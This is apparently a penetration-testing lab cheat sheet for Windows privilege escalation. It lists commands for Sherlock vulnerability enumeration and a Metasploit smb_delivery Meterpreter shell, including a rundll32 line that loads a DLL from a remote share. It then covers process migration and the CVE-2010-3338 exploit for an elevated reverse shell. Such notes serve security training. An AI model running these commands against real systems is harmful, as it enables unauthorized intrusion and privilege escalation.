**Querying Current Patch Level
```
wmic qfe
```

**Running Sherlock
```
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```

**Obtaining a Meterpreter Shell
```
search smb_delivery
use 0
show options
show targets
set target 0
exploit
```

**Rundll Command on Target Host
```
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

**Searching for Local Privilege Escalation Exploit
```
search 2010-3338
use 0
```

**Migrating to a 64-bit Process
```
sessions -i 1
getpid
ps
migrate 2796
background
```

**Setting Privilege Escalation Module Options
```
set SESSION 1
set lhost 10.10.14.3
set lport 4443
show options
```

**Receiving Elevated Reverse Shell
```
exploit
getuid
sysinfo
```
